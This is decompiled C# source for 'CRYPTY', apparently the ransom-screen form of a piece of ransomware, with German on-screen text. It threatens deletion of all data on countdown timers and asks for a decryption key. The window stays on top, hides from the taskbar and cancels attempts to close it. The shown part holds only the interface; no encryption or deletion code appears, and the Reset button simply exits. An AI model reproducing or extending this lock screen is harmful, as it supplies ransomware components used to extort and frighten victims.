using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace CRYPTY;

[DesignerGenerated]
public class mainFrame : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("Logo")]
	internal virtual PictureBox Logo
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CompleteEraseBox")]
	internal virtual Panel CompleteEraseBox
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataEraseBox")]
	internal virtual Panel DataEraseBox
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("InfoBox")]
	internal virtual TextBox InfoBox
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("KeyBox")]
	internal virtual TextBox KeyBox
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("KeyLabel")]
	internal virtual Label KeyLabel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("KeyConfirm")]
	internal virtual Button KeyConfirm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button KeyReset
	{
		[CompilerGenerated]
		get
		{
			return _KeyReset;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = KeyReset_Click;
			Button keyReset = _KeyReset;
			if (keyReset != null)
			{
				((Control)keyReset).remove_Click(eventHandler);
			}
			_KeyReset = value;
			keyReset = _KeyReset;
			if (keyReset != null)
			{
				((Control)keyReset).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("CompleteEraseText")]
	internal virtual Label CompleteEraseText
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataEraseText")]
	internal virtual Label DataEraseText
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TimeToCompleteErase")]
	internal virtual Label TimeToCompleteErase
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TimeToDataErase")]
	internal virtual Label TimeToDataErase
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("updateTimers")]
	internal virtual Timer updateTimers
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public mainFrame()
	{
		((Form)this).add_Closing((CancelEventHandler)delegate(object sender, CancelEventArgs e)
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Expected O, but got Unknown
			mainFrame_Closing(RuntimeHelpers.GetObjectValue(sender), (FormClosingEventArgs)e);
		});
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_01f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0200: Expected O, but got Unknown
		//IL_040d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0417: Expected O, but got Unknown
		//IL_05ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b8: Expected O, but got Unknown
		//IL_064c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0656: Expected O, but got Unknown
		//IL_06ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f6: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(mainFrame));
		Logo = new PictureBox();
		CompleteEraseBox = new Panel();
		CompleteEraseText = new Label();
		DataEraseBox = new Panel();
		InfoBox = new TextBox();
		KeyBox = new TextBox();
		KeyLabel = new Label();
		KeyConfirm = new Button();
		KeyReset = new Button();
		DataEraseText = new Label();
		TimeToCompleteErase = new Label();
		TimeToDataErase = new Label();
		updateTimers = new Timer(components);
		((ISupportInitialize)Logo).BeginInit();
		((Control)CompleteEraseBox).SuspendLayout();
		((Control)DataEraseBox).SuspendLayout();
		((Control)this).SuspendLayout();
		Logo.set_BorderStyle((BorderStyle)1);
		((Control)Logo).set_Location(new Point(48, 12));
		((Control)Logo).set_Name("Logo");
		((Control)Logo).set_Size(new Size(135, 106));
		Logo.set_TabIndex(0);
		Logo.set_TabStop(false);
		CompleteEraseBox.set_BorderStyle((BorderStyle)1);
		((Control)CompleteEraseBox).get_Controls().Add((Control)(object)TimeToCompleteErase);
		((Control)CompleteEraseBox).get_Controls().Add((Control)(object)CompleteEraseText);
		((Control)CompleteEraseBox).set_Location(new Point(12, 134));
		((Control)CompleteEraseBox).set_Name("CompleteEraseBox");
		((Control)CompleteEraseBox).set_Size(new Size(205, 141));
		((Control)CompleteEraseBox).set_TabIndex(1);
		CompleteEraseText.set_AutoSize(true);
		((Control)CompleteEraseText).set_BackColor(Color.Transparent);
		CompleteEraseText.set_FlatStyle((FlatStyle)1);
		((Control)CompleteEraseText).set_Font(new Font("Consolas", 11.25f, (FontStyle)5, (GraphicsUnit)3, (byte)0));
		((Control)CompleteEraseText).set_ForeColor(Color.Gold);
		((Control)CompleteEraseText).set_Location(new Point(-1, -1));
		((Control)CompleteEraseText).set_Name("CompleteEraseText");
		((Control)CompleteEraseText).set_Size(new Size(200, 18));
		((Control)CompleteEraseText).set_TabIndex(0);
		CompleteEraseText.set_Text("Löschung aller Daten in:");
		DataEraseBox.set_BorderStyle((BorderStyle)1);
		((Control)DataEraseBox).get_Controls().Add((Control)(object)TimeToDataErase);
		((Control)DataEraseBox).get_Controls().Add((Control)(object)DataEraseText);
		((Control)DataEraseBox).set_Location(new Point(12, 281));
		((Control)DataEraseBox).set_Name("DataEraseBox");
		((Control)DataEraseBox).set_Size(new Size(205, 141));
		((Control)DataEraseBox).set_TabIndex(2);
		((TextBoxBase)InfoBox).set_BorderStyle((BorderStyle)1);
		InfoBox.set_CharacterCasing((CharacterCasing)1);
		((Control)InfoBox).set_Enabled(false);
		((Control)InfoBox).set_Location(new Point(223, 12));
		InfoBox.set_Multiline(true);
		((Control)InfoBox).set_Name("InfoBox");
		((TextBoxBase)InfoBox).set_ReadOnly(true);
		InfoBox.set_ScrollBars((ScrollBars)1);
		((Control)InfoBox).set_Size(new Size(565, 338));
		((Control)InfoBox).set_TabIndex(3);
		InfoBox.set_Text(componentResourceManager.GetString("InfoBox.Text"));
		((TextBoxBase)KeyBox).set_BorderStyle((BorderStyle)1);
		((Control)KeyBox).set_Location(new Point(227, 380));
		((Control)KeyBox).set_Name("KeyBox");
		((Control)KeyBox).set_Size(new Size(561, 20));
		((Control)KeyBox).set_TabIndex(4);
		KeyLabel.set_AutoSize(true);
		((Control)KeyLabel).set_Font(new Font("Consolas", 15.75f, (FontStyle)5, (GraphicsUnit)3, (byte)0));
		((Control)KeyLabel).set_ForeColor(Color.Gold);
		((Control)KeyLabel).set_Location(new Point(223, 353));
		((Control)KeyLabel).set_Name("KeyLabel");
		((Control)KeyLabel).set_Size(new Size(358, 24));
		((Control)KeyLabel).set_TabIndex(5);
		KeyLabel.set_Text("Entschlüsselungskey eingeben:");
		((Control)KeyConfirm).set_Cursor(Cursors.get_Hand());
		((Control)KeyConfirm).set_Location(new Point(650, 406));
		((Control)KeyConfirm).set_Name("KeyConfirm");
		((Control)KeyConfirm).set_Size(new Size(138, 23));
		((Control)KeyConfirm).set_TabIndex(6);
		((ButtonBase)KeyConfirm).set_Text("Computer entschlüsseln");
		((ButtonBase)KeyConfirm).set_UseVisualStyleBackColor(true);
		((Control)KeyReset).set_Cursor(Cursors.get_Hand());
		((Control)KeyReset).set_Location(new Point(227, 406));
		((Control)KeyReset).set_Name("KeyReset");
		((Control)KeyReset).set_Size(new Size(75, 23));
		((Control)KeyReset).set_TabIndex(7);
		((ButtonBase)KeyReset).set_Text("Reset");
		((ButtonBase)KeyReset).set_UseVisualStyleBackColor(true);
		DataEraseText.set_AutoSize(true);
		((Control)DataEraseText).set_BackColor(Color.Transparent);
		DataEraseText.set_FlatStyle((FlatStyle)1);
		((Control)DataEraseText).set_Font(new Font("Consolas", 11.25f, (FontStyle)5, (GraphicsUnit)3, (byte)0));
		((Control)DataEraseText).set_ForeColor(Color.Gold);
		((Control)DataEraseText).set_Location(new Point(-1, -1));
		((Control)DataEraseText).set_Name("DataEraseText");
		((Control)DataEraseText).set_Size(new Size(208, 18));
		((Control)DataEraseText).set_TabIndex(1);
		DataEraseText.set_Text("Nächste Datenlöschung in:");
		TimeToCompleteErase.set_AutoSize(true);
		((Control)TimeToCompleteErase).set_BackColor(Color.DarkRed);
		((Control)TimeToCompleteErase).set_Font(new Font("Consolas", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)TimeToCompleteErase).set_ForeColor(Color.Black);
		((Control)TimeToCompleteErase).set_Location(new Point(28, 63));
		((Control)TimeToCompleteErase).set_Name("TimeToCompleteErase");
		((Control)TimeToCompleteErase).set_Size(new Size(142, 24));
		((Control)TimeToCompleteErase).set_TabIndex(1);
		TimeToCompleteErase.set_Text("00:00:00:00");
		TimeToDataErase.set_AutoSize(true);
		((Control)TimeToDataErase).set_BackColor(Color.DarkRed);
		((Control)TimeToDataErase).set_Font(new Font("Consolas", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)TimeToDataErase).set_ForeColor(Color.Black);
		((Control)TimeToDataErase).set_Location(new Point(28, 62));
		((Control)TimeToDataErase).set_Name("TimeToDataErase");
		((Control)TimeToDataErase).set_Size(new Size(142, 24));
		((Control)TimeToDataErase).set_TabIndex(2);
		TimeToDataErase.set_Text("00:00:00:00");
		updateTimers.set_Enabled(true);
		updateTimers.set_Interval(1000);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.DarkRed);
		((Control)this).set_CausesValidation(false);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)KeyReset);
		((Control)this).get_Controls().Add((Control)(object)KeyConfirm);
		((Control)this).get_Controls().Add((Control)(object)KeyLabel);
		((Control)this).get_Controls().Add((Control)(object)KeyBox);
		((Control)this).get_Controls().Add((Control)(object)InfoBox);
		((Control)this).get_Controls().Add((Control)(object)DataEraseBox);
		((Control)this).get_Controls().Add((Control)(object)CompleteEraseBox);
		((Control)this).get_Controls().Add((Control)(object)Logo);
		((Control)this).set_Cursor(Cursors.get_No());
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("mainFrame");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("CRYPTY");
		((Form)this).set_TopMost(true);
		((ISupportInitialize)Logo).EndInit();
		((Control)CompleteEraseBox).ResumeLayout(false);
		((Control)CompleteEraseBox).PerformLayout();
		((Control)DataEraseBox).ResumeLayout(false);
		((Control)DataEraseBox).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void mainFrame_Closing(object sender, FormClosingEventArgs e)
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		((CancelEventArgs)(object)e).Cancel = true;
		object obj = "Der Vorgang konnte nicht beendet werden!";
		object obj2 = 16;
		object obj3 = "Abbrechen des Prozesses nicht möglich";
		_ = (object)Interaction.MsgBox(RuntimeHelpers.GetObjectValue(obj), (MsgBoxStyle)Conversions.ToInteger(obj2), RuntimeHelpers.GetObjectValue(obj3));
	}

	private void KeyReset_Click(object sender, EventArgs e)
	{
		Application.Exit();
	}
}
